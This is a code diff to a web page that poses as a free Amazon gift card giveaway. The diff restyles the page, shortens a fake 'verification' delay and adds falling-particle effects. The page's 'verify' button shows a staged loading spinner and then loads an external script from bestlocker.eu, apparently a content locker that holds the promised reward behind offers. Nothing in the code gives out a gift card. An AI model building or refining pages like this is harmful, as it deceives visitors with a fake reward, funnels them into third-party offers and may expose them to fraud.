@@ -15,22 +15,23 @@
     }
 
     .container {
+      position: relative;
       text-align: center;
       padding: 40px 20px;
       z-index: 2;
     }
 
-    /* Headline typing animation */
+    /* Typewriter Headline */
     h1 {
       font-size: 2rem;
-      color: #fff;
       margin-bottom: 30px;
-      text-shadow: 0 0 15px #ff9900;
       white-space: nowrap;
-      border-right: 3px solid #ff9900;
-      width: 22ch;
       overflow: hidden;
-      animation: typing 4s steps(22), blink .75s step-end infinite alternate;
+      border-right: 3px solid #ff9900;
+      width: 25ch; /* text length */
+      color: #fff;
+      text-shadow: 0 0 15px #ff9900;
+      animation: typing 4s steps(25), blink .75s step-end infinite alternate;
     }
     @keyframes typing {
       from { width: 0 }
@@ -49,6 +50,7 @@
 
     /* Amazon Gift Card Style */
     .card {
+      position: relative;
       padding: 20px;
       border-radius: 20px;
       background: rgba(255,255,255,0.1);
@@ -58,13 +60,14 @@
       transition: transform 0.3s;
       cursor: pointer;
     }
-    .card:hover {
-      transform: translateY(-5px);
-    }
-    .card h2 { color: #FF9900; }
+    .card:hover { transform: translateY(-5px); }
+
+    .card h2 { font-size: 1.3rem; margin: 10px 0; color: #FF9900; }
+    .card p { font-size: 1rem; color: #fff; }
 
     /* Verify Button */
     .verify-btn {
+      display: inline-block;
       margin-top: 15px;
       padding: 12px 20px;
       font-size: 1rem;
@@ -79,7 +82,7 @@
     }
     .verify-btn:hover { background: #e68a00; }
 
-    /* Button Spinner */
+    /* Loading Spinner */
     .loading {
       border: 3px solid #f3f3f3;
       border-top: 3px solid #FF9900;
@@ -115,12 +118,11 @@
       width: 90%;
       max-width: 500px;
       margin: 8% auto;
-      padding: 30px 20px;
+      padding: 20px;
       position: relative;
       box-shadow: 0 0 25px rgba(255,153,0,0.5);
       color: #fff;
       text-align: center;
-      min-height: 200px;
     }
     .close-btn {
       position: absolute;
@@ -132,21 +134,43 @@
       text-shadow: 0 0 10px #ff9900;
     }
 
-    /* Popup Spinner */
-    .popup-spinner {
-      border: 6px solid rgba(255,255,255,0.2);
-      border-top: 6px solid #ff9900;
+    /* Glowing Animated Text */
+    .glow-text {
+      font-size: 1.2rem;
+      font-weight: bold;
+      background: linear-gradient(90deg, #ff9900, #ff00ff, #00ffff, #ff9900);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-size: 300%;
+      animation: glow-move 3s linear infinite;
+      text-shadow: 0 0 15px rgba(255,153,0,0.6);
+      margin-top: 10px;
+    }
+    @keyframes glow-move {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+
+    /* Snow / Paper / Fire Particles */
+    .particle {
+      position: fixed;
+      top: -10px;
+      width: 8px; height: 8px;
       border-radius: 50%;
-      width: 50px;
-      height: 50px;
-      margin: 50px auto;
-      animation: spin 1s linear infinite;
+      pointer-events: none;
+      z-index: 1;
+      animation: fall linear infinite;
+    }
+    @keyframes fall {
+      0% { transform: translateY(0) translateX(0) rotate(0deg); opacity: 1; }
+      100% { transform: translateY(100vh) translateX(50px) rotate(360deg); opacity: 0; }
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>🎁 Free Amazon Gift Card</h1>
+    <h1>🎁 Claim Your Amazon Gift Card</h1>
     <div class="cards">
       <div class="card">
         <h2>$50 Amazon Gift Card</h2>
@@ -175,7 +199,7 @@
   </div>
 
   <script>
-    // Button loading then popup
+    // Button Click Loading
     function startVerification(btn) {
       btn.disabled = true;
       let originalText = btn.innerHTML;
@@ -185,30 +209,67 @@
         btn.innerHTML = originalText;
         btn.disabled = false;
         openVerifyPopup();
-      }, 10000); // 10 sec loading
+      }, 2000); // 2 sec loading
     }
 
-    // Popup open with spinner then locker
+    // Popup Loading + Locker Delay
     function openVerifyPopup() {
-      let popup = document.getElementById("verifyPopup");
-      let box = document.getElementById("verify-box");
-      popup.style.display = "block";
-      box.innerHTML = '<div class="popup-spinner"></div><p>Please wait...</p>';
+      document.getElementById("verifyPopup").style.display = "block";
+      document.getElementById("verify-box").innerHTML = `
+        <div class="popup-loading">
+          <div class="loading"></div>
+          <p class="glow-text">Loading Verification...</p>
+        </div>
+      `;
 
+      // 3 sec delay before locker load
       setTimeout(() => {
-        box.innerHTML = "";
+        document.getElementById("verify-box").innerHTML = "";
         var s = document.createElement("script");
         s.type = "text/javascript";
         s.src = "https://bestlocker.eu/iframeLoader/9c03b476-84b9-11f0-948d-8a5fb7be40ea";
-        box.appendChild(s);
-      }, 3000); // 3 sec spinner inside popup
+        document.getElementById("verify-box").appendChild(s);
+      }, 3000);
     }
 
-    // Close popup
+    // Close Popup
     document.querySelector(".close-btn").onclick = () => {
       document.getElementById("verifyPopup").style.display = "none";
       document.getElementById("verify-box").innerHTML = "";
     };
+
+    // Generate Snow + Paper + Fire Particles
+    function createParticle(type) {
+      const p = document.createElement("div");
+      p.classList.add("particle");
+
+      if (type === "snow") {
+        p.style.background = "white";
+        p.style.width = p.style.height = Math.random()*5+3 + "px";
+        p.style.animationDuration = Math.random()*5+5 + "s";
+      } 
+      else if (type === "paper") {
+        p.style.width = "10px";
+        p.style.height = "14px";
+        p.style.background = "#f5deb3";
+        p.style.animationDuration = Math.random()*6+6 + "s";
+      } 
+      else if (type === "fire") {
+        p.style.background = "orange";
+        p.style.width = p.style.height = Math.random()*4+2 + "px";
+        p.style.boxShadow = "0 0 10px red";
+        p.style.animationDuration = Math.random()*3+3 + "s";
+      }
+
+      p.style.left = Math.random()*100 + "vw";
+      document.body.appendChild(p);
+
+      setTimeout(()=> p.remove(), 12000);
+    }
+
+    setInterval(()=> createParticle("snow"), 500);
+    setInterval(()=> createParticle("paper"), 1200);
+    setInterval(()=> createParticle("fire"), 800);
   </script>
 </body>
 </html>
